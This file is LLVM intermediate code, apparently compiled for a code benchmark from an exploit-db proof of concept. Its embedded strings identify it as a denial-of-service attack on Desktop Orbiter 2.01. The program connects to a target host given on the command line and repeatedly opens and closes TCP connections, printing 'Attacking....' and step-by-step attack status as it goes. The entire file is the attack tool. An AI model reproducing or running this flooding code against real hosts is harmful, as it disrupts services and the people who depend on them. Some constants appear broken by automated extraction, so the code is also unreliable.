; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_22694.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_22694.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [20 x i8] c"Usage:%s -h <host>\0A\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"h\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [11 x i8] c"Bad Input\0A\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [63 x i8] c"\0A\0A\09\09#########################################################\0A\00", align 1
@.str.5 = private unnamed_addr constant [61 x i8] c"\09\09# Proof of Concept by Luca Ercoli luca.ercoli@inwind.it #\0A\00", align 1
@.str.6 = private unnamed_addr constant [61 x i8] c"\09\09#         Desktop Orbiter 2.01 Denial of Service        #\0A\00", align 1
@.str.7 = private unnamed_addr constant [62 x i8] c"\09\09#########################################################\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"\0AAttacking....\0A\07\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.10 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.11 = private unnamed_addr constant [40 x i8] c"\0A[Attack status] Step %d/25 : Complete!\00", align 1
@.str.12 = private unnamed_addr constant [21 x i8] c"\0AAttack Complete!\0A\0A\07\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %11, align 8
  store i32 1, i32* %12, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp slt i32 %13, 2
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = call i32 @exit(i32 0) #4
  unreachable

21:                                               ; preds = %2
  br label %22

22:                                               ; preds = %34, %21
  %23 = load i32, i32* %4, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = call i32 @getopt(i32 %23, i8** %24, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  store i32 %25, i32* %10, align 4
  %26 = icmp ne i32 %25, -1
  br i1 %26, label %27, label %35

27:                                               ; preds = %22
  %28 = load i32, i32* %10, align 4
  switch i32 %28, label %31 [
    i32 104, label %29
  ]

29:                                               ; preds = %27
  %30 = load i8*, i8** @optarg, align 8
  store i8* %30, i8** %11, align 8
  br label %34

31:                                               ; preds = %27
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 @exit(i32 0) #4
  unreachable

34:                                               ; preds = %29
  br label %22

35:                                               ; preds = %22
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 2
  %38 = load i8*, i8** %37, align 8
  %39 = call %struct.hostent* @gethostbyname(i8* %38)
  store %struct.hostent* %39, %struct.hostent** %7, align 8
  %40 = icmp eq %struct.hostent* %39, null
  br i1 %40, label %41, label %44

41:                                               ; preds = %35
  %42 = call i32 @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %43 = call i32 @exit(i32 1) #4
  unreachable

44:                                               ; preds = %35
  %45 = load i32, i32* @AF_INET, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  store i32 %45, i32* %46, align 4
  %47 = load i32, i32* @PORT, align 4
  %48 = call i32 @htons(i32 %47)
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %48, i32* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %51 = load %struct.hostent*, %struct.hostent** %7, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i64, i64* %52, align 8
  %54 = inttoptr i64 %53 to %struct.in_addr*
  %55 = bitcast %struct.in_addr* %50 to i8*
  %56 = bitcast %struct.in_addr* %54 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %55, i8* align 4 %56, i64 4, i1 false)
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %58 = call i32 @bzero(i32* %57, i32 8)
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.4, i64 0, i64 0))
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.5, i64 0, i64 0))
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.6, i64 0, i64 0))
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.7, i64 0, i64 0))
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %64 = load i32, i32* @AF_INET, align 4
  %65 = load i32, i32* @SOCK_STREAM, align 4
  %66 = load i32, i32* @IPPROTO_TCP, align 4
  %67 = call i32 @socket(i32 %64, i32 %65, i32 %66)
  store i32 %67, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %72

69:                                               ; preds = %44
  %70 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %71 = call i32 @exit(i32 1) #4
  unreachable

72:                                               ; preds = %44
  %73 = load i32, i32* %6, align 4
  %74 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %75 = call i32 @connect(i32 %73, %struct.sockaddr* %74, i32 4)
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %80

77:                                               ; preds = %72
  %78 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0))
  %79 = call i32 @exit(i32 0) #4
  unreachable

80:                                               ; preds = %72
  store i32 0, i32* %9, align 4
  br label %81

81:                                               ; preds = %113, %80
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 99500
  br i1 %83, label %84, label %116

84:                                               ; preds = %81
  %85 = load i32, i32* @AF_INET, align 4
  %86 = load i32, i32* @SOCK_STREAM, align 4
  %87 = load i32, i32* @IPPROTO_TCP, align 4
  %88 = call i32 @socket(i32 %85, i32 %86, i32 %87)
  store i32 %88, i32* %6, align 4
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %90, label %93

90:                                               ; preds = %84
  %91 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  %92 = call i32 @exit(i32 1) #4
  unreachable

93:                                               ; preds = %84
  %94 = load i32, i32* %6, align 4
  %95 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 4)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %110

98:                                               ; preds = %93
  %99 = load i32, i32* %12, align 4
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.11, i64 0, i64 0), i32 %99)
  %101 = load i32, i32* %12, align 4
  %102 = icmp eq i32 %101, 25
  br i1 %102, label %103, label %106

103:                                              ; preds = %98
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0))
  %105 = call i32 @exit(i32 0) #4
  unreachable

106:                                              ; preds = %98
  %107 = load i32, i32* %12, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %12, align 4
  %109 = call i32 @sleep(i32 1)
  br label %110

110:                                              ; preds = %106, %93
  %111 = load i32, i32* %6, align 4
  %112 = call i32 @close(i32 %111)
  br label %113

113:                                              ; preds = %110
  %114 = load i32, i32* %9, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %9, align 4
  br label %81

116:                                              ; preds = %81
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0))
  ret i32 1
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @herror(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
